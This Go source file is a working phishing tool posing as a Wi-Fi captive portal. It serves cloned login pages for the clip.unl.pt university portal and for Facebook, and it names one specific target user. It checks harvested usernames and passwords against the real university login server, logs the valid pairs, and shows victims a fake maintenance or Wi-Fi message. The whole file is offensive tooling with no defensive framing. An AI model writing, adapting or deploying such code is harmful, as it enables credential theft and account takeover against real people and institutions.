package common

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"path"
	"strings"
	"sync"
)

const indexHTML = "index.html"
const resFolder = "__res__"

const clipUnlPtSuccessMsgTarget = `Sucesso. Pode-se ligar ao Wi-Fi.`
const clipUnlPtSuccessMsg = `Este Hotspot está temporariamente em manutençao. Tente mais tarde.
Relembramos que há hotspots funcionais noutras zonas do edifício.`

// Website represents a fully functional servable website.
type Website struct {
	Name     string
	WebLink  string
	LoginURL string

	HandleFunctions map[string]func(http.ResponseWriter, *http.Request)
	RawFiles        []string

	LineMatchRe string
	ResMatchRe  string

	CancelFunc  context.CancelFunc
	logfile     *os.File
	server      http.Server
	fileIoMutex sync.Mutex
}

// GetFile is a utility function. Takes a filename and
// returns the expected relative path.
func (web *Website) GetFile(filename string) string {
	return path.Join(web.Name, filename)
}

// GetResource is a utility function. Takes a resource
// filename and returns the expected relative path.
func (web *Website) GetResource(res string) string {
	return path.Join(web.Name, "__res__", res)
}

// Log appends a username and password to the logfile.
func (web *Website) Log(u string, p string) {
	msg := fmt.Sprintf("User: %s | Pass: %s\n", u, p)
	log.Print(msg)

	web.fileIoMutex.Lock()
	_, err := fmt.Fprint(web.logfile, msg)
	web.fileIoMutex.Unlock()

	if err != nil {
		log.Print(err)
	}
}

// Serve binds the website handlers
// and serves on the specified port.
func (web *Website) Serve(port uint) {

	addr := ":" + fmt.Sprint(port)
	log.Printf("Serving on %s", addr)

	ctx, cancel := context.WithCancel(context.Background())

	web.CancelFunc = cancel
	web.server = http.Server{
		Addr: addr,
	}

	for url, f := range web.HandleFunctions {
		http.HandleFunc(url, f)
	}

	http.HandleFunc("/"+web.Name+"/"+resFolder+"/", func(w http.ResponseWriter, r *http.Request) {
		ServeFile(w, r, "."+r.URL.Path)
	})

	go func() {
		err := web.server.ListenAndServe()
		if err != http.ErrServerClosed {

			log.Fatal(err)
		} else {
			log.Print("Closed server.")
		}
	}()

	select {
	case <-ctx.Done():
		{
			log.Print("Shutdown")
			web.server.Shutdown(ctx)
		}
	}

}

func (web *Website) openLogFile() {

	_logfile := web.Name + ".log"
	logFile, err := os.OpenFile(_logfile,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	if err != nil {
		log.Fatal(err)
	}

	web.logfile = logFile
}

// ClipUnlPt is the constructor of https://clip.unl.pt
func ClipUnlPt() *Website {

	var targets = []string{
		"b.covas",
	}

	var web = Website{
		Name:    "clip.unl.pt",
		WebLink: "https://clip.unl.pt",
		RawFiles: []string{
			"index.raw.html",
			"invalid.raw.html",
		},
		LineMatchRe: `(<link|<img|<script)`,
		ResMatchRe:  `(href=".*?"|src=".*?")`,
	}

	web.HandleFunctions = map[string]func(http.ResponseWriter, *http.Request){

		"/": func(w http.ResponseWriter, r *http.Request) {
			index := web.GetFile(indexHTML)
			ServeFile(w, r, index)
		},

		"/login/": func(w http.ResponseWriter, r *http.Request) {

			u, p := HandleLogin(r)
			valid := clipUnlPtIsValid(u, p)

			if !valid {
				ServeFile(w, r, web.GetFile("invalid.html"))
				return
			}

			web.Log(u, p)
			for _, value := range targets {
				if u == value {
					fmt.Fprintln(w, clipUnlPtSuccessMsgTarget)
					web.CancelFunc()
				} else {
					fmt.Fprintln(w, clipUnlPtSuccessMsg)
				}
			}
		},

		"/recuperar_senha/": func(w http.ResponseWriter, r *http.Request) {
			fmt.Fprintln(w, "Por questões de segurança, o serviço está indisponível no programa Captive Portal.")
		},
	}

	web.openLogFile()
	return &web
}

// FacebookCom is the constructor of https://m.facebook.com
func FacebookCom() *Website {

	var web = &Website{
		Name: "facebook.com",
		RawFiles: []string{
			"./facebok.com/index.raw.html",
		},
		LineMatchRe: `(<link|<img|<script)`,
		ResMatchRe:  `(href=".*?"|src=".*?")`,
	}

	web.openLogFile()
	return web
}

// WebsiteMap maps folder names to website structs.
var WebsiteMap = map[string]func() *Website{
	"clip.unl.pt":  ClipUnlPt,
	"facebook.com": FacebookCom,
}

func clipUnlPtIsValid(u string, p string) bool {

	loginURL := "https://clip.fct.unl.pt/utente/eu"
	errMsg := "Erro no pedido"

	if u == "" || p == "" {
		return false
	}

	form := url.Values{}
	form.Add("identificador", u)
	form.Add("senha", p)

	res, err := http.PostForm(loginURL, form)

	if err != nil {
		log.Println(err)
		return false
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Println(err)
		return false
	}

	if strings.Contains(string(body), errMsg) {
		return false
	}

	return true
}

func facebookComIsValid(u string, p string) bool {
	return false
}
